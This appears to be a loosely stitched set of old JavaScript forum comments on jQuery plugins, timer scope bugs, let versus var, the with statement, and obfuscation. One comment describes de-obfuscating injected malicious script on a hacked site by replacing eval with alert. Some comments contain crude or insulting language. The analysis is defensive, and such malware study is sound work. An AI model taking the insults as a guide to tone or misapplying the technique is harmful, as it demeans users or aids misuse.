http://docs.jquery.com/Plugins/Authoring is a better (maybe more complex too) guide to write jQuery plugins 
I have got this far: http://pastebin.com/Zq1J0B8A As I get further, I will update this post. EDIT: That code adds the following html: http://pastebin.com/BJAcMrRA
You made me imagine someone typing this in a terminal: cat http://* | grep 'jquery.plugin.js'
that might just work :p
That's pretty awesome!
Ok thanks. I'm at work now and am not going to trust that domain lol.. but when I get home I'm going to get one of their servers and see what the logs do within a few days.
Forgot to ask.. Although you kind of answered it. You don't have root access right? Just ftp and sql..
Does wikipedia ship their own subset of jquery?
Technically no.. you can put an anon function in there but I was just suggesting a pattern I think is best. Its how the underscore docs do it also
How do call this JS on Wikipedia?
Your problem is likely that you've declared timerID as a local variable to that function, but are calling clearTimeout outside of that function, thus there's no access to timerID. get rid of your "var" in front of it. then try: clearTimeout(timerID); that's it. now, ideally, you'd just add var timerID; at the end of all of your other var declarations at the top, to keep it local to that script.
 clearTimeout(timerID); See [SO](http://stackoverflow.com/questions/3015319/jquery-javascript-settimeout-cleartimeout) for some more information. EDIT: the SO article also gives a good example for the scope of your timerID
 var maxx = 20; var maxy = 20; var bird = document.getElementById("image"); var birdx = 0; var birdy = 0; var dx = 10; var dy = 5; var timerID; //animate bird function fly() { birdx = birdx + dx; birdy = birdy + dy bird.style.left = birdx + 'px'; bird.style.top = birdy + 'px'; if (birdx &gt; maxx || birdx &lt; 0) dx = -dx; if (birdy &gt; maxy || birdy &lt; 0) dy = -dy; var timerID = setTimeout("fly()", 45); } At any time just "clearTimeout(timerID);" and it should stop.
there should be no "var" before the timerID in the function block, as this will declare local variable timerID. The code should be this. var maxx = 20; var maxy = 20; var bird = document.getElementById("image"); var birdx = 0; var birdy = 0; var dx = 10; var dy = 5; var timerID; //animate bird function fly() { birdx = birdx + dx; birdy = birdy + dy bird.style.left = birdx + 'px'; bird.style.top = birdy + 'px'; if (birdx &gt; maxx || birdx &lt; 0) dx = -dx; if (birdy &gt; maxy || birdy &lt; 0) dy = -dy; timerID = setTimeout("fly()", 45); }
This was the problem! Got it working now, so that the clearInterval runs once fly() has executed 10 times. Works a treat, thanks!
Sure, you could assume the worst and go through a time consuming host change every week, or just realize that, barring any other evidence, this is almost always a breach of some old, vulnerable code on your own website. When your Javascript doesn't work, do you go submit a bug against the browser, immediately just switch to another browser because the first one is 'broken', or try and fix it? Always assume you're the idiot. In general, a large, successful hosting company is a hell of a lot less likely to be at fault than you - a single, lowly developer. Ocaam's Razor - The simplest solution is usually the correct one. It's infinitely more likely that your code sucks than the entire data center has been taken over.
Well if you looking for online documentation the web is full of tutorials. If you prefer to learn by video I would suggest Pluralsight. They have some great tutorials on Javascript and Jquery. You could try the free trial. Additionally Mozilla has the best Javascript reference I have found https://developer.mozilla.org/en/JavaScript
If it's not too complicated, how did you figure out what it was doing?
Mozilla never ceases to astound me. Google hasn't turned up many good tutorials, though. Mostly decade old sites. And most jQuery tutorials aren't aimed at JavaScript/programming novices. Thanks for the recommendations, though, these look like they'll help quite a bit.
What does "your Javascript doesn't work" have to do with a security breach? I understand your point. I personally would still reduce risk as much as possible (if I cared about my users). 
Using that kind of absolute thinking you don't know that any machine exposed to the internet is secure the second you put it up. The compromise in this case was in userspace, and there's absolutely nothing there to suggest anything more. 
Upvoted for "raped it back". I'm going to start referring to all autocorrect problems as such.
I used code search quite often (although not to find sites w. specific scripts). Too bad Google decided to shut down the service.
Distrust any code that isn't easily readable, and yours was terribly obfuscated; `eval` and the arguments `(p, a, c, k, e, d)` rang alarm bells. This means the author ran it through a popular encryptor. First I used a terminal command called `wget`. It allowed me to download the source without risk, rather than using a browser where I'd likely suffer whatever the intended ill. From here I changed `eval` to `alert` and ran the script in chrome's JS console. The output was the HTML it is trying to inject. A similar method would be doing this in a Node.js interactive session. I saw it was inserting an `iframe` so from there a used `wget` again to get the new source. This again was encrypted so I did the same thing: remove `eval` turn it to an `alert`. By this point I knew something was very wrong, so I didn't go further. I could tell that the intention was to inject a flash object, but I didn't fully stringify this to know the where it was going to request the flash object from. For this to have happened means that unauthorised access occurred: thus change your passwords, obliterate your host, whatever. To tell in future I would suggest keeping a version control system and you can compare src changes to production. You would instantly know if things had gone wrong.
Wells Fargo.
This is awesome, and something I will recommend when asked if I know of any good references. Good find! (or maybe good work?)
isnt WSE, well, shitty?
Thank you so much for your help.
Step one: Read the docs. google: mdn settimeout -&gt; https://developer.mozilla.org/en/DOM/window.setTimeout Since the docs clearly explain how it's done, there is no second step. :]
No. It is low key, but that is a benefit rather than a drawback. 
I have have missed out on some details but this would be simple manipulation of Javascript. Once it has been 'unpacked' it is generally simplified, and the important functions stand out; anything to do with string building should be given first attention. At this stage it was still obfuscated, so I ran the function as an alert just to see the output. The 'garbage' strings are character references, so on `eval` they get interpreted as text. Generally the the output of the important functions should allow you to understand the code without a full 'decryption'. But yes, `wget`, `curl`, Nodejs and the Chrome JS console are your friends.
&gt; simple EcmaScript5 API reference ECMAScript. :)
This question pops up rather frequently, so I wrote a blog post about it a few months back, [Learning JavaScript](http://derek.io/blog/2011/learning-javascript/). In in, there's links to books, videos, and mailing lists. If you prefer videos, check out [YUI Theater](http://yuilibrary.com/theater/). There's of course a lot of YUI specific stuff in there, but there's quite a bit of general JavaScript as well (see: Crockford videos). As far as jQuery, I don't have any specific suggestions aside from read some books, and just browse around any search results for "learning jquery". Good luck!
greasemonkey, chrome extension, bookmarklet, however you feel most comfortable.
I envision closures [like this](http://www.perfectcatgifts.com/wp-content/uploads/wpsc/product_images/242912.jpg). There are various "holes" in the function that allows you to gain access in specifically designed ways. You don't get free reign, but the balls inside (mostly) do. There are lots of different ways to make use of closures in JS, but the method described above (the [module pattern](http://www.yuiblog.com/blog/2007/06/12/module-pattern/)) is the most common.
Thank you! I'll check it out once I get done skimming the Mozilla library.
On a side note, it's not the best idea to do animations that way. [Requestanimationframe](http://hacks.mozilla.org/2011/08/animating-with-javascript-from-setinterval-to-requestanimationframe/) is a newer and better way of animating elements. For your short animation this is not an issue, but I just thought I'd let you know.
This useful reference is useless without more 'thees' and 'thous' and some 'begatting'.
And here's a blog post outlining some ways to use requestAnimationFrame to replace setTimeout and setInterval, with fallbacks: http://blog.joelambert.co.uk/2011/06/01/a-better-settimeoutsetinterval/ I'm finding it really easy and helpful for animation. Hopefully others will find this useful, as well.
This must be the NIV :)
Yes, correct. Is there something further you are trying to suggest?
Pyramid scheme in Portuguese. Nothing related to javascript.
There's already MDN, but I guess this gives more direct picture. There are some oversights and poor descriptions, but good effort overall.
I really like the layout of this, especially the modifiable, executable examples for every property and method. Might be nice to have a simple "table of contents" for each page with links to each property/method.
Take jsLint as your model. It likes to smite unbelievers, saying "Thou shalt have no other Javascript but me".
&gt; It fixes one of JavaScript's fundamental issues. No one wants function scope. No one ever did. Do I understand you right? You're saying that function scope is a "fundamental issue" that "no one wants" and was "fixed" by let? Is that a joke? Function scope is a clean way to code that combined with closures makes JS a powerful language. Just to let you know: there is at least one that really wants functions scope and always did! BTW: maybe one of the reasons of not implementing let is that people write powerful software without it? BTW II: do you really think block scope is the most important of all "New in JavaScript 1.7"?
&gt;Do I understand you right? You're saying that function scope is a "fundamental issue" that "no one wants" and was "fixed" by let? Is that a joke? Block scope is a super set of function scope. The body of a function happens to be a block. There can be also many other blocks inside. Once `let` is supported, there won't be any reason whatsoever to use `var`. (FWIW, Crockford agrees with this.) &gt;do you really think block scope is the most important of all "New in JavaScript 1.7"? Yes, it makes your code a bit nicer and it's also something you'd use dozens of times each and every day. **Edit:** Read this: https://developer.mozilla.org/en/JavaScript/Reference/Statements/let
Just quick comment about the way you use setTimeout. You should use function directly instead of a string. *setTimeout("fly()", 45)* becomes *setTimeout(fly, 45)*. With *setTimeout("fly()", 45)*, the string is being "eval" and "eval" is "evil".
Simple. JS 1.7 was a prototype implementation of ES4. ES4 died and was replaced by ES5. let is in ES6 and has slightly different semantics, it will come soon. (2013). Firefox basically has a bunch of propietory non standard code like IE (JScript) does. That's let/generators/iterators/yada yada
I have used up a lot Jasmine and I'm still trying to find some difference with this framework. Almost everything is named and used in the same way. Why create a new BDD test framework, when there is already a lot of existing one ? Especially if you are going to do it in the exact same way.
Sorry for the delay on releasing, I rewrote it from scratch again :) Just couldn't get it the way I wanted. This isn't final/production ready yet, but I wanted to let you know it's out there, and I welcome contributions (though this will get finished relatively soon, with or without them... I'm very interested in bug reports, etc, though). https://github.com/jamon/includejs Again, to specify why this is different than the existing implementations that I've seen (require.js for example)... you can have optional dependencies, and in theory, I'll have error handling working very soon. The dependency tree is managed more like a nested linked list than a queue (a la require.js), which means one can fail, and only the things depending on it will fail, the script will continue to function. Additionally, I'm not going to have as many "other" features as require.js has... it's a simple JS loader at the moment, and I intend to keep it that way. Minified it is 1400 bytes-ish. I expect when completely finished, it will be 2-3kb minified. edit: added support for error callbacks (tested in IE9, FF 6, chrome 16-dev) edit2: FYI it doesn't work on IE right now... not all the tests pass :)
I had kinda forgotten about _let_ but looking at the Moz documentation, it doesn't really get rid of var except to change var into let. (they're both three letters; your variables still need to be declared) While the limiting of scope is marginally useful, it's solved easily with a unique variable name within function scope that is only used within that block. In other words, _let_ allows for slightly cleaner code (and possibly fewer errors) but it doesn't save the developer much in the way of time. It's not like a forEach method on arrays that are actually quite useful and save having to declare variables just to loop through an array.
&gt;let is in ES6 and has slightly different semantics Any details on this? https://developer.mozilla.org/en/New_in_JavaScript_1.7 only mentions this: &gt;**Note:** The global scoping rules of let definitions are likely to change in ES6.
&gt;In other words, let allows for slightly cleaner code (and possibly fewer errors) but [...] There is no "but". &gt;It's not like a forEach method on arrays [...] forEach (and friends) can be monkey-patched. You can't do that with `let`.
Because if you use `let`, [code doesn't run][1]. [1]: http://strager.net/let.html
That's a little tautological.
I may be missing the point of let, but does let really bring much new to javascript? The let example in the docs: var x = 5; var y = 0; let (x = x+10, y = 12) { print(x+y + "\n"); } print((x + y) + "\n"); can be written without let like this: var x = 5; var y = 0; (function(x,y) { print(x + y + "\n"); })(x + 10, 12); print((x + y) + "\n"); Not as neat, but still perfectly reasonable.
does the trick, but not exactly reasonable.
http://dictionary.reference.com/browse/fundamental [adj] serving as, or being an essential part of, a foundation or basis; basic; underlying: fundamental principles; the fundamental structure.
&gt;I may be missing the point of let [...] The main point is block scope. You have some kind of block (curly braces) and any variable you declare with `let` will be only visible inside this block and any other blocks it contains. This means you can use that popular best practice you may know from many other languages: Variables are declared on first use. (With function scope: Variables are declared at the top of the function.) It's more convenient and it also simplifies the code a bit.
Yes, you are missing the point of *let*. The point is block-scope. Variables declared with *let* have block scope. Things that are 'blocks' include functions, *if* and *else if* and *else* statements, loops, et cetera. Variables declared with *var* have scope within the whole function, regardless of whether it was declared in a loop or an if statement, or any other kind of block.
&gt;I can understand wanting block level scope, but I also think it's not such a big issue. And certainly not having block level scope, to me, is not a "Javascript fundamental issue".
I like `let` as much as the next guy but I'll take destructuring assignment over `let` any day of the week. There are never times when I'm writing some code and think, "man, if only I had `let` right now!" Destructuring assignment at least reduces verbosity which is tedious and annoying to type all the time. But regardless of what you and I think or want, `let` is simply not part of a published standard. For now it's a proprietary Mozilla extension to their implementation of ECMAScript, which they call JavaScript. That's the answer to your actual question, no need to bash people over the head and badger them with pedantic antics. As for your 2nd and 3rd questions, Q1 and Q2, no other browser vendor is currently implementing `let` in any public builds (i.e. not happening in the foreseeable future). This is because it's not yet part of any ES standard. You can look this up yourself for JavaScriptCore and v8, they are open source and developed in the open (bazaar style). Even if they were on the horizon for some of the more cutting edge JS engines you would still be saddled with Firefox 3, IE 7 - 10, etc. so you wouldn't really be able to take advantage of `let` anyway in production code. If you don't care about cross browser compat then just use Firefox and be happy with `let` today.
See http://wiki.ecmascript.org/doku.php?id=harmony:let
You're right - I should have kept reading, the docs had this example later: if (x &gt; y) { let gamma = 12.7 + y; i = gamma * x; } That would be very handy, and be very tedious to replicate using function blocks.
We've always had let in javascript. It's called with. The problem is that Crockford's an ass and told everyone not to use it and even went so far as to help *take it the fuck away from me* in harmony. Anyways in the mean time you can just use with and an object literal and bam instant block scope: for (var i=0; i&lt;3; ++i) { // object members introduced in this statement // are scoped to the block following it. with ({num: i}) { setTimeout(function() { alert(num); }, 10); } } (copypasta shamelessly stolen from http://stackoverflow.com/questions/61552/are-there-legitimate-uses-for-javascripts-with-statement) 
It's just a nicer syntax. If you had macros, you could define your own let using lambda (I think this is how Scheme implements let, although I could be wrong) , but it's a bit ugly to have to code every block like that.
I think you're missing the point of nanothief's post. He's(?) implementing (essentially) a block *using* function scope.
Not having to declare all variables at the beginning of a function would be really nice, like every other modern language. It's not like you lose function scope, block scope is a superset. I'm not sure you understand the issues enough to be so opinionated. edit: I seems a lot of people don't know that the reason you *need* to declare all function scope variables at the beginning of your function is that *this is what javascript is doing internally when you use var* and leaving it hidden is just asking for some incredibly frustrating and hard to find bugs. http://www.2ality.com/2011/02/javascript-variable-scoping-and-its.html
Exactly! I don't see myself ever needing to use var if let is available... so handy.
With the added benefits of being slow and not working with most minifiers. Just what we need! =]
No he was right. I only noted the use of the let block, which as I demonstrated isn't hard to replace with a function block. The real killer feature of let though is declaring a variable using `let` rather than `var`: if (x &gt; y) { let gamma = 12.7 + y; i = gamma * x; } the `gamma` variable is local to the current block (in this case the if block). To replicate that without `let` you would have to do this: if (x &lt; y) { (function(gamma) { i = gamma * x; })(12.7 + y); } That is way too much overhead for people to actually bother doing it. 
The OP is great for general use. MDN is great for browser use.
There's a little tree view thing on the left under the search box you can expand/collapse to get links to the properties and methods.
It's an analogy. You're not reducing risk. You're creating unnecessary work. If you ever have a real security breach at your data center, or on one of their shared servers, then that course of action may be prudent. If some old code on your site introduces a vulnerability limited to your own files, it's just nonsense.
Interesting!
It took me a while to work out what you were saying that was new, but I see now. You (and Zamarok) are saying the main point of let will be that if-statements, loops etc will automatically open a let-scope so you don't have to do it yourself? That's convenient of course, but it's a minor caveat. I'm surprised it makes a difference to you if you didn't see the point of let before. BTW, in the meantime, I think the best way to introduce scoped variables is to just open an anonymous function call, but *without* passing in the variables to be bound. ie. just use var within the function scope. if (x &gt; y) (function() { gamma = 12.7 + y i = gamma * x; })(); There's a bit of boilerplate but overall it's fairly readable this way.
It misses a paragraph about the motivation of obfuscating and also an overview on tools available.
So, you're going to use let with everything instead of var? I would assume let comes with a tiny performance hit. edit: Yeah, sorry about that. I'd like to call this my free stupid comment of the year.
Once browsers fully support let, it should be the same speed.
You're right, that does work better. I would put a `var` before `gamma = 12.7 + y` though, as I think currently `gamma` will be declared as a new global variable.
Almost certainly possible. I'd look into doing this with html5 video APIs, but there may well be an existing flash player that has the necessary controls. Your proposed method might be difficult to keep in synch. I'd consider caching the entire video without playing, then requesting each segment as it's needed.
Could you also provide a simple example-savefile?
Just what I thought, given that evidence.
`let` is a minor nicety. Generators (or preferably full-fledged coroutines like in Python) would be huge. Then we could have things like Twisted's `inlineCallbacks` (or `deferredGenerator`) to make asynchronous code a lot more pleasant. http://blog.mekk.waw.pl/archives/14-Twisted-inlineCallbacks-and-deferredGenerator.html
&gt; It fixes one of JavaScript's fundamental issues. No one wants function scope. No one ever did. The architecture of a given application dictates the given success of a named variable reference in use with closure. In most of my applications the top level structure is a function and not an object literal, so I would little or no reusable potential from the "let" keyword over the "var" keyword in regards to extensibility and the importance of closure as in function scope the keywords would apply identically. Arguably the greatest benefit for using "let" is radical performance boosts as multiscope lookups are removed in favor of local identifiers. Unfortunately there are costs to that benefit in that: there should be some bloating of code that comes from extensive use of a new keyword, there would likely be no performance benefit in loop blocks because the named reference would be instantiated in each loop iteration thereby negating the performance benefit anyways, this performance benefit would not be absolute as it would largely not apply, and it would do little to named references that expect instantiation in function scope are intended for use solely in closure. With this considerations in mind I would say there probably is still some benefit to having "let" available, but the benefits provided by "let" are largely overstated and dramatically so. I would carry this torch even further in that the problem of leaking variables from function contains is eliminated with the use of the "use strict" pragma. **Edit:** Life is not fun if we are not talking about hoisting. It appears the hoisting mess was the primary stated motivation for forking JSHint from JSLint. The supposed big advantage with "let" is that it will instantiate in place without hoisting to the top of its container. I can see how this is HUGE for people who do not understand hoisting or cannot be bothered to figure it out. Really, though, "let" is not the complete solution for hoisting. Unassigned functions will continue to be hoisted and their use upon variables in closure will continue to have hoisted implications regardless of whether you instantiate with "var" or "let", and you will still get errors when a named reference is called before its instantiated in strict mode. As a result in an extremely simplified, although perhaps the most common, use case "let" can be that golden solution. In all other cases though it only serves to further complicate the problem by introducing false expectations. The same kind of false expectations that arise from not caring that "var" instantiations are hoisted, and so outside the most common use case you have accomplished nothing.
Yes, you are missing the point. The point is removing unneeded lookups. if (x) { let x; do something with x; return x; // the lookup for x is confined to this one "if" block. } The only real value to "let" is that if you do not mind overusing the very minimal baggage of the three letter keyword you can dramatically increase application performance in large applications by eliminating unnecessary lookups, which is especially important if the scope of a function is huge. There are, however, architecture limitations, such as accessing data from other lookups that would negate this benefit on some level.
Obfuscation is a horrible problem. It offers no security advantages, is typically evident of either malware or advertising code (which is sometimes malware anyways), and it saves characters often in manners complete insignificant to minification. As a result I would suggest people ALWAYS avoid obfuscating their own code. I appreciate this article walking through some common conventions of obfuscation not because this a wonderful practice to take to heart, but because its a horrible practice that demands often manual effort to peek into the excessive trickiness of bad intentions.
Irrelevant. I am using version 1.8.5 code in an app I am building without specifying version number. "let" was introduced in a version earlier than the code that I am using, namely the getOwnPropertyNames method. Therefore if I needed to specify a version number to use "let" then logically I should have to use a version number to allow code introduced after "let".
Out of curiosity why would you want to start playing videos automatically without user assistance if they are hidden and muted? This sounds like a potentially malicious practice.
Why do you think that? Variables declared in a function scope are much faster than those in the global scope, so I would assume that variables declared in block scope (let) would be even faster.
Crockford argues in favour of having maintainable code that is also easy to understand and debug instead of typing less characters. Explicit &gt; Implicit in my book and I agree with Crockford.
There are some applications where Flash is simply a much better option (especially since HTML5 video has significantly worse hardware performance). I think this is one of those times.
&gt; Function scope is a clean way to code that combined with closures makes JS a powerful language. This is an odd argument. You could just as easily say "block scope is a clean way to code that combined with blocks makes JS a powerful language." [edit: To be clear, I'm saying there is nothing in particular about function scope that creates extra synergy with closures beyond the simple fact that the function is the scope] In any case, putting variable declarations near where they are used is important in any language. It just makes the code clearer. In JavaScript, putting variables where they are used (when nested in blocks) can lead to maintainability issues, so by convention we put them at the top of the function. This is a compromise between clarity and maintainability, where by convention the community has chosen maintainability. With let there is no compromise, you are free to define variables where you'd like. I'd argue that the clarity and maintainability of such a fundamental operation of your language is very important.
Are iterators/generators in ES6?
Interesting. I would've expected HTML5 to have better video performance. Do you have a reference for that?
Obfuscation was never really meant to be for security. The best use case of it is mainly for software protection. It makes the source enough hard to read so that in a realistic scenario nobody would want to copy and reuse the code. People often say that for those cases it's best to get a lawyer, but just obfuscating the production code is often just less trouble.
For the motive, you can see the reply I made on the other comment. Also this was meant for both way, understanding obfuscated and being able to obfuscate code. For the tools, I'm not aware of existing tool that do a lot of advanced stuff, since it does require a lot of static analyses. The only one that I found that does more complex thing is Google Closure, but it does so for compression.
What you just described is security.
Why would you expect that?
&gt; These videos should all begin playing when you enter the site (although muted and preferably hidden). When you hover over one of the videos it should begin playing and be shown. They are all going to automatically begin playing, and then begin playing when hovered over? Were you high on drugs when you wrote that?
Not sure if he's retarded or trolling.
That's too high-brow for the people on this site.
One of the original motivations towards utilising the video hardware in HTML5 was poor Flash video performance. Obviously Adobe have also addressed this, but there's still an extra layer between the render surface at the bare metal.
Not in the way people usually use the term security.
Are you high on drugs?
So by 2013, we'll have a feature that has been around in other languages since at least 1980? Yay, progress! ;_;
I can see how it makes sense to know the tricks so you can at least try to figure out what a given chunk of obfuscated code you came across does, so thanks for that. I wouldn't recommend doing it yourself, though.
this is tjhollowaychuck's successor to expresso, afaik. 
Good approach. I think it's a good idea to first learn Javascript, and then learn jQuery. You'll understand jQuery better and also understand when to use it and when to use plain Javascript / something else.
Maybe more like copyright protection.
If you like an easy way out and are not in it for the learning experience: there are a lot of existing Javascript animation libraries that you could use: http://www.admixweb.com/2010/01/07/17-javascript-animation-frameworks-worth-to-seing/
I was a little low on coffeine and sleep. Though I still don't think extensive use of let is going to be the end-all of scope problems.
Compressorator is a good tool to compare JS compression tools. However, Packer with base62 is also mentioned in this list, and sometimes scores high. Although Packer saved bytes, it also has to compile/eval by the client on every request, which costs CPU and diminishes the speed value.
All browsers have at least some [support for the FileReader API](https://developer.mozilla.org/en/DOM/FileReader#Browser_compatibility), which I guess is the 'bottleneck' in support for your script. These save files worked fine as a test: http://tslendinga.com/Diablo2/diablo_2_saved_games.htm 
He means they become unmuted when hovered over.
I guess I explained myself incorrectly. I think we will be making a button that says "Start remix" or something like that and when you press that button the videos will begin to play (hidden and muted until you hover them so you can create your own remix).
what does this do? just show the stats of a character or something? 
&gt;In the version that is now lost, I had some crazy code for automating bit field parsing and all that jazz. Now I have to do that all over again. :( Time to learn to use versioning software. Get started with https://github.com/
I'm writing my javascript in coffeescript, so the javascript output is already obfuscated and unreadable for me :D
That's not the whole story. Variables don't have speed, it's the look-up that takes time and has to go over the scope chain. If your code is running from global scope that look-up will take identical time to a function scoped variable referenced in that function scope. 
There is no reason I can think why it would be slower? If we look at how Javascript handles scope chaining, you'll see that let will eliminate all of the checks of the parent scopes, which should at minimum be the same speed as a variable referenced in it's own scope and will return undefined faster for undeclared variables because it only has to check "this" and not the other scopes that var would have to first do.
I don't really need with. I'm just fine with function / object scope almost all the time, and with the module pattern I don't really have a problem dealing with larger scope scope hiding issues. I'd really love it, though, if someone could explain to me exactly what let brings to the table that the with-using-object-literal doesn't already provide. They're both explicit scoping constructs that should in theory then both require similar speed penalties and similar amounts of work to minify in their presence. Honestly, the only difference I can come up with is that let doesn't require any large egos to admit they were wrong. Thus the Crockford bashing above.
Just because a language feature allows programmers to create an unholy mess doesn't mean there's not a place for it. See for example pointers in C. Global variables. Module pattern. Eval. You can make a mess with any of them. But eval begat JSON. Modules promote tidy code, etc. Another thing we're losing as with goes by the wayside is the ability to use it to create and use (embedded) [DSL](https://en.wikipedia.org/wiki/Domain-specific_language#Usage_patterns)s in javascript. Imagine an object "clearly-named-dsl-introducing-object." Fill it with short domain-specific functions foo, bar, and baz and don't worry about whether you might want to name something else foo later. Now without "with" you can still do: clearly-named-dsl-introducing-object.foo(arguments); clearly-named-dsl-introducing-object.bar(arg, clearly-named-dsl-introducing-object.baz()); But I'm going to be honest I had to use copy and paste just to type this block of code. Using with, otoh, it becomes: with (clearly-named-dsl-introducing-object) { foo(arguments); bar(arg, baz ()); } Seems pretty damned easy to understand and debug to me, provided you understand the purpose of and proper use for the DSL. But that's required regardless of which way you write it.
The `var`-like syntax of `let` allows for easy conversion from existing code, lighter load on run-time and compile-time optimizers, and doesn't have the minification problem (`let` can be treated as `var` in minifiers for most cases).
You don't *have* to declare your variables at the top of your scope, JavaScript doesn't *require* you to do this.
 var bar = function (a, b) { return a + b; }, baz = function () { return 1; }; with (clearly-named-dsl-introducing-object) { foo(arguments); bar(arg, baz ()); } Now it's no longer easy to understand. var o = clearly-named-dsl-introducing-object, bar = function (a,b) { return a+b; }, baz = function () { return 1; }; o.foo(arguments); o.bar(arg, o.baz()); No ambiguities going on there now.
Why wait? Implement `let` now: https://github.com/raganwald/homoiconic/blob/master/2010/10/let.md
I see obfuscation as the modern misguided method of preventing users from right clicking images to prevent people from "stealing" them. You only deter the casual thief and the vast majority of them would probably be deterred by a minified code base as it is.
with is broken, dude. try figuring out the difference between setting and reading a variable in a with scope.
Oh c'mon. `with` is just horrible. It's ambiguous, error prone, gets in the way of minification, and it also makes your code *very* slow. It's not an option.
"Fundamental" as in "1+1=2 is fundamental math knowledge". As in "basic" or "underlying". It's nothing big, revolutionary, or ground-breaking. It's basic stuff. Something you can count on and build upon.
Thanks for that. I knew that there should be some Harmony page about `let` somewhere, but my google-fu was apparently too weak.
You seem to assume that this is something like a shim/shiv you can just use with any JavaScript engine. It isn't. I guess it's for that slow experimental extensible JS engine... forgot its name.
&gt;the benefits provided by "let" are largely overstated The biggest benefit is probably that it will make JavaScript even easier to learn. Everyone is used to block scope.
Sure. I read [his blog posting](http://yuiblog.com/blog/2006/04/11/with-statement-considered-harmful/) too. The problem is you've now littered your current namespace with the meaningless variable "o" which really should be deleted or at least set to undefined or something. More on this below. You've actually taken it a step further and extended the dsl by overwriting a couple of functions in your counter example, but I'm going to simplify a bit and assume we're talking about just the following: defined in a library: var clearly-named-dsl-introducing-object = { foo: function (x) { return 1; }, bar: function (a,b) { return a+b; }, baz = function () { return 1; }; } in the current namespace, then, we're talking about the difference between: with clearly-named-dsl-introducing-object { foo(arguments); bar(arg, baz()); } and var o = clearly-named-dsl-introducing-object; o.foo(arguments); o.bar(arg, o.baz()); delete o; // this isn't going to work ... see below So once you figure out [how to delete "o" in your current context](http://perfectionkills.com/understanding-delete/) you have basically equivalent constructs. I've heard that this pattern of setting a local variable is probably faster on current implementations, but I'm not really conviced that it needs to be. Under the covers, it should be at least as fast: pseudocode using with: -- on with statement: for each binding in object: (this is the expensive part) bind name in local scope -- for each use of name: look up name in local scope and use it (pretty much free) pseudocode using var pattern: -- on var statement: re-bind object to local scope (pretty much free) -- for each use of name: dereference one level (o-&gt;bar() for example) and use it So performance considerations should come down to cost of a single level of dereferencing at each use vs. a single loop and bind at the top. Probably pretty sensitively depends on ratio between number of bindings in the introduced object vs number of times its children are called while in local scope. Edit: lost some code formatting whoops
Reminds me of [this article on How to Write Unmaintainable Code](http://thc.org/root/phun/unmaintain.html) so I read this article as a humor piece myself. [Here are the reddit comments](http://www.reddit.com/r/programming/comments/8ozon/how_to_write_unmaintainable_code_a_stepbystep/) from a submission 2 years ago, pretty funny stuff.
While the bigger issue with what you said x-skeww already addressed, and clojures are an accepted method of encapsulation it's really just a hacky workaround for more proper methods of encapsulation compared to private variables; not the best example of how javascript isn't broken in this regard.
I'm definitely not talking performance, I'm talking readability. `with` destroys readability, in his other talks he mentions something like the following example with(foo) { ... bar = baz; ... } What are we setting: foo.bar = baz; // or bar = foo.baz; // or foo.bar = foo.baz; // or foo = baz; // ? Even with a deep understanding of how `with` and scope chains work, to another coder looking at this code or yourself a year later, can you immediately discern your intent from looking at the block? It's confusing and forces you to take into account the context for determining the intent, any performance gains certainly cannot be worth the time it takes to maintain this code. If I, by default, program not using `with` and later find that my code is being bottle-necked because I assigned a long namespace to a local variable, by all means I'd switch and heavily comment the code using `with` if that produced the desired performance increases but it seems like an early optimization that just isn't worth the headache down the road.
I absolutely agree with this. *Setting* stuff in private scope like this is dangerous and hard to read. It's an antipattern and his opposition to this practice was totally justified. I just think with ~~is~~ was a power tool and it's a shame to see it go. Just because a circular saw is dangerous and a terrible way to slice cheese for a sandwich doesn't mean I should get rid of it. Maybe I could still have it in my garage in case I need to cut a 2X4?
But how is with different from any other scoping construct? block_construct { let x = 1; // x is in scope // outer variables are too } with ({x: 1}) { // x is in scope // outer variables are too } (function (x) { // x is in scope // outer variables are too })(1) Introducing scope trades cycles and readability for tidyness and modularity. There's no reason for with to be any slower, harder to read, harder to minify, or more dangerous than the other scope introducing constructs. I'd argue it's just an unfamiliar pattern with an undeserved bad reputation due to some loud howling from prominent figures. 
I guess if there are more blocks than there are functions in the call stack, so there will be more scopes to check if you refer to an outside variable. Theoretically, it could slow down closures, although I would expect good VMs to optimize around that.
No, you don't have to, but every competent javascript programmer does. Because if you use var then that's what's actually happening, that's what the language does, any variables declared with var in a function are declared at the beginning, before executing the rest of the code. Not doing that manually is just asking for hard to find bugs since it then becomes invisible. Why am I surprised that bunch of fucking dilettantes are arguing about things they don't know about on reddit...sigh.
If eval and global variables died now, I would be happy. Also with prevents a lot of compiler optimizations, and is generally insecure. If the code was handling user defined input, and the clearly-named-dsl-introducing-object had a property called arg, then that property would be accessed (not what you want at all). The code would also break if a browser vendor / library adds an arg property to the object prototype.
It seems like you're thinking I don't know this by making assumptions on what I said. You're complaining about being forced to declare variables at the top of your functions as though it makes a difference in any way to javascript other than readability and maintainability, if not declaring variables at the top of scope is that important to you, and you want to take the risks associated with not declaring them at the top you're not being forced to. Maybe you should be more clear in what you actually want.
I think [Javascript Garden](http://bonsaiden.github.com/JavaScript-Garden/) is really good. There's also [a series of lectures by Donald Crockford] (http://www.yuiblog.com/crockford/) which I haven't watched myself but look good. Lastly [an article about the application of Object Oriented Programming within Javascript] (http://msdn.microsoft.com/en-gb/magazine/cc163419.aspx#S3) - it's a very good article about a number of aspects of js which sometimes get glossed over.
&gt; other than readability and maintainability Oh well then, other than those small things sure. Since you were arguing that it's not necessary then I did assume you didn't know this. That was giving you the benefit of the doubt. I assumed you were not a bad coder and were just ignorant of this fact, as many well meaning people are.
Upvote for suggesting Github. :)
Where did I endorse this behaviour?
Again, it was the benefit of the doubt. I assumed you weren't wasting everyones time with bullshit pedantry and had something of substance to say. So, ok fine, javascript does not *require* you to do this by throwing syntax errors but does require you do do this by having hard to predict behaviour if you do not. What's your point?
It is used in the way people use the term security. I can say this with all the dignity and arrogance afforded because I am CISSP certified. If the term security is used in some other different manner then it is probably wrong.
I am not used to block scope and I had no problem learning JavaScript. I think you mean to say that people who come from a background of C, or its variants, are used to block scope. I don't really care about those people because JavaScript is wildly different many more ways than just function scope.
Again, that is a misguided failed attempt at security. If you wanted your image to be secure then you would actual secure it. What that actually means is isolating it from public access, controlling its dissemination, and establishing intellectual property protections around it. If you fail to take any of these measures then you do not, by action, want security no matter how strongly you may claim to the contrary. Good intentions are irrelevant once the harm is evident. &gt; You only deter the casual thief and the vast majority of them would probably be deterred by a minified code base as it is. No, they would not and there is no reason to think they would be.
That is the only reason I completely detest CoffeeScript. Unless CoffeeScript output can be executed without compilation to JavaScript I will never touch it. Otherwise, CoffeeScript sounds like a fantastic effort.
